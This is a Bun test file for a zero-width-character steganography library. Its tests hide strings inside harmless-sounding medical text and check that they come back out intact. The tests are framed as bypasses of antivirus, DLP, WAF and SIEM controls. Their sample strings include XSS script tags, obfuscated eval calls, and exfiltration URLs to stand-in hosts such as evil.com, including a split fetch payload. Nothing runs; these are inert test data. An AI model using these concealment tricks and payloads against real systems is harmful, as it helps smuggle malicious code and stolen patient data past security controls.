import { expect, test } from 'bun:test'
import zws from '../index'

test('Antivirus signature evasion through fragmented payloads', () => {
  const innocuousText = 'Medical research guidelines for pharmaceutical studies'
  const fragmentedMalware = "eval(atob('bWFsaWNpb3Vz'))"

  const weaponizedText = zws.embed(innocuousText, fragmentedMalware)
  const hiddenPayload = zws.extract(weaponizedText)

  expect(hiddenPayload).toBe(fragmentedMalware)
  expect(hiddenPayload).toContain('atob')
  expect(weaponizedText).toContain('pharmaceutical')
  expect(weaponizedText).not.toContain('eval')
})

test('Email security filter bypass using zero-width URL obfuscation', () => {
  const medicalUpdate = 'New clinical trial results available for review'
  const obfuscatedURL =
    'ht\u200Btp\u200Cs://ma\u200Blicio\u200Cus.com/steal\u200B-data'

  const weaponizedUpdate = zws.embed(medicalUpdate, obfuscatedURL)
  const hiddenURL = zws.extract(weaponizedUpdate)

  expect(hiddenURL).toBe(obfuscatedURL)
  expect(hiddenURL).toContain('\u200B')
  expect(hiddenURL).toContain('\u200C')
  expect(hiddenURL).toContain('licio')
})

test('Content scanning bypass through encoded HTML entities', () => {
  const normalContent = 'Patient safety protocols must be followed'
  const encodedScript = '&#60;script&#62;alert()&#60;/script&#62;'

  const weaponizedContent = zws.embed(normalContent, encodedScript)
  const hiddenScript = zws.extract(weaponizedContent)

  expect(hiddenScript).toBe(encodedScript)
  expect(hiddenScript).toContain('&#60;')
  expect(hiddenScript).toContain('&#62;')
  expect(weaponizedContent).not.toContain('<script>')
})

test('DLP system bypass through medical terminology disguise', () => {
  const medicalRecord = 'Laboratory results for patient identification number'
  const sensitiveData = 'SSN:123-45-6789 MRN-medical-ref-num-disguise'

  const weaponizedRecord = zws.embed(medicalRecord, sensitiveData)
  const hiddenSensitive = zws.extract(weaponizedRecord)

  expect(hiddenSensitive).toBe(sensitiveData)
  expect(hiddenSensitive).toContain('SSN:')
  expect(hiddenSensitive).toContain('MRN-')
})

test('Network monitoring evasion through DNS tunneling disguise', () => {
  const routineReport = 'Weekly medical department status report'
  const dnsExfiltration = 'evil-medical-research.com/exfil?data='

  const weaponizedReport = zws.embed(routineReport, dnsExfiltration)
  const hiddenExfiltration = zws.extract(weaponizedReport)

  expect(hiddenExfiltration).toBe(dnsExfiltration)
  expect(hiddenExfiltration).toContain('evil-medical-research.com')
  expect(hiddenExfiltration).toContain('exfil')
})

test('Sandox detection evasion through time-delayed execution', () => {
  const patientNote = 'Schedule follow-up appointment in 3 months'
  const delayedMalware = 'setTimeout(f,300000)'

  const weaponizedNote = zws.embed(patientNote, delayedMalware)
  const hiddenMalware = zws.extract(weaponizedNote)

  expect(hiddenMalware).toBe(delayedMalware)
  expect(hiddenMalware).toContain('setTimeout')
  expect(hiddenMalware).toContain('300000')
})

test('Keyword filtering bypass through medical synonym substitution', () => {
  const instruction = 'Standard patient care protocol documentation'
  const bypassedKeywords = 'adm1n=medication_admin exp10it=therapeutic'

  const weaponizedInstruction = zws.embed(instruction, bypassedKeywords)
  const hiddenBypass = zws.extract(weaponizedInstruction)

  expect(hiddenBypass).toBe(bypassedKeywords)
  expect(hiddenBypass).toContain('adm1n')
  expect(hiddenBypass).toContain('medication_admin')
  expect(hiddenBypass).toContain('exp10it')
})

test('SIEM log correlation bypass through distributed payload', () => {
  const report1 = 'First quarter medical device performance report'
  const report2 = 'Second quarter pharmaceutical compliance audit'
  const report3 = 'Third quarter patient satisfaction survey results'

  const payload1 = 'part1: var malicious'
  const payload2 = "part2: = 'https://evil.com';"
  const payload3 = "part3: fetch(malicious + '/exfil');"

  const weaponized1 = zws.embed(report1, payload1)
  const weaponized2 = zws.embed(report2, payload2)
  const weaponized3 = zws.embed(report3, payload3)

  const reconstructed =
    zws.extract(weaponized1) +
    zws.extract(weaponized2) +
    zws.extract(weaponized3)

  expect(reconstructed).toContain('var malicious')
  expect(reconstructed).toContain('evil.com')
  expect(reconstructed).toContain('fetch(malicious')
})

test('Machine learning detection bypass through adversarial text', () => {
  const clinicalTrial = 'Phase 3 clinical trial results show promising outcomes'
  const adversarialPayload = 'n0rm4l m3d1c4l <script>steal_data()</script>'

  const weaponizedTrial = zws.embed(clinicalTrial, adversarialPayload)
  const hiddenAdversarial = zws.extract(weaponizedTrial)

  expect(hiddenAdversarial).toBe(adversarialPayload)
  expect(hiddenAdversarial).toContain('m3d1c4l')
  expect(hiddenAdversarial).toContain('steal_data()')
})

test('Static analysis tool bypass through dynamic string construction', () => {
  const procedure = 'Surgical procedure preparation checklist'
  const dynamicConstruction = "window[['ev','al'].join('')]('alert(1)')"

  const weaponizedProcedure = zws.embed(procedure, dynamicConstruction)
  const hiddenDynamic = zws.extract(weaponizedProcedure)

  expect(hiddenDynamic).toBe(dynamicConstruction)
  expect(hiddenDynamic).toContain('join')
  expect(hiddenDynamic).toContain("'ev','al'")
  expect(hiddenDynamic).not.toContain('eval')
})

test('Web Application Firewall bypass through HTTP parameter pollution', () => {
  const medicalForm = 'Patient intake form submission guidelines'
  const wafBypass = "param=safe&param=<script>alert('XSS')</script>"

  const weaponizedForm = zws.embed(medicalForm, wafBypass)
  const hiddenBypass = zws.extract(weaponizedForm)

  expect(hiddenBypass).toBe(wafBypass)
  expect(hiddenBypass).toContain('param=safe')
  expect(hiddenBypass).toContain('<script>')
})

test('Behavioral detection bypass through legitimate API abuse', () => {
  const systemMaintenance = 'Scheduled system maintenance notification'
  const legitimateAbuse = "fetch('/api/patient/search',{limit:99999})"

  const weaponizedMaintenance = zws.embed(systemMaintenance, legitimateAbuse)
  const hiddenAbuse = zws.extract(weaponizedMaintenance)

  expect(hiddenAbuse).toBe(legitimateAbuse)
  expect(hiddenAbuse).toContain('/api/patient/search')
  expect(hiddenAbuse).toContain('limit:99999')
})

test('Content validation bypass through medical encoding standards', () => {
  const patientData = 'Patient data encoded according to HL7 FHIR standards'
  const encodedMalicious = 'MSH|^~\\&|MALICIOUS^EVIL|EXPLOIT||ADT^A01'

  const weaponizedData = zws.embed(patientData, encodedMalicious)
  const hiddenMalicious = zws.extract(weaponizedData)

  expect(hiddenMalicious).toBe(encodedMalicious)
  expect(hiddenMalicious).toContain('MSH|')
  expect(hiddenMalicious).toContain('MALICIOUS^EVIL')
  expect(hiddenMalicious).toContain('ADT^A01')
})
